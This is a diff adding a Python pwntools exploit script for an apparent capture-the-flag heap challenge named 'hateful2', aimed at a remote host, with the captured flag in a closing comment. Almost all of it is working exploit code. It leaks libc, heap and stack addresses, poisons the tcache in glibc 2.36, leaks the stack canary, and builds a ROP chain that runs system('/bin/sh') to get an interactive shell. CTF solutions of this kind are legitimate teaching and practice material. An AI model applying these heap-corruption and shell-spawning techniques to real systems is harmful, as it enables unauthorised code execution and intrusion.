@@ -1,0 +1,99 @@
+from pwn import *
+
+exe = ELF("./hateful2_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+script = '''
+breakrva 0x1853
+b *view_message + 173
+b *main + 38
+'''
+
+def add_message(index, size, data):
+    p.sendlineafter(b">> ", b"1")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+    p.sendlineafter(b"Size: ", f"{size}".encode())
+    p.sendafter(b">> ", data)
+
+def remove_message(index):
+    p.sendlineafter(b">> ", b"4")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+
+def view_message(index):
+    p.sendlineafter(b">> ", b"3")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+
+def edit_message(index, data):
+    p.sendlineafter(b">> ", b"2")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+    p.sendafter(b">> ", data)
+
+p = remote("52.59.124.14", 5022)
+#p = gdb.debug("./hateful2_patched", gdbscript = script)
+
+# Leak libc via unsorted bin
+for i in range(9):
+    add_message(i, 0xf8, b"A" * 8)
+for i in range(8):
+    remove_message(i)
+view_message(7)
+p.recvuntil(b"Message: ")
+libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1d2cc0
+__environ = libc_base + libc.symbols['__environ']
+
+# Leak heap via fastbin
+for i in range(8):
+    add_message(i, 0x58, b"A" * 8)
+for i in range(8):
+    remove_message(i)
+view_message(7)
+p.recvuntil(b"Message: ")
+heap_base = u64(p.recv(5).ljust(8, b"\x00")) << 12
+
+# tcache poisoning (libc 2.36) and leak stack via environ
+target = (__environ - 0x10) ^ heap_base >> 12
+edit_message(6, p64(target))
+add_message(0, 0x58, b"A" * 8)
+add_message(0, 0x58, b"A" * 0x10)
+view_message(0)
+p.recvuntil(b"A" * 0x10)
+rbp = u64(p.recv(6).ljust(8, b"\x00")) - 0x128
+
+# house of spirit
+## leak canary
+add_message(0, 0xf8, b"A" * 8)
+remove_message(0)
+target = (rbp + 0x80) ^ heap_base >> 12
+edit_message(0, p64(target))
+add_message(0, 0xf8, b"A" * 8)
+add_message(0, 0xf8, b"A" * 0x19)
+view_message(0)
+p.recvuntil(b"A" * 0x19)
+canary = u64(b"\x00" + p.recv(7))
+
+## perform ROP
+system = libc_base + libc.symbols['system']
+pop_rdi = libc_base + 0x00000000000277e5
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+ret = pop_rdi + 1
+
+payload = b"A" * 8 + p64(canary)
+payload += b"B" * 8 + p64(pop_rdi)
+payload += p64(binsh) + p64(ret)
+payload += p64(system)
+
+for i in range(2):
+    add_message(i, 0x78, b"A" * 8)
+for i in range(2):
+    remove_message(i)
+target = (rbp - 0x10) ^ heap_base >> 12 
+edit_message(1, p64(target))
+add_message(0, 0x78, b"A" * 8)
+add_message(0, 0x78, payload)
+
+# trigger ROP
+p.sendlineafter(b">> ", b"5")
+
+p.interactive()
+#ENO{W3_4R3_50RRY_4G41N_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}
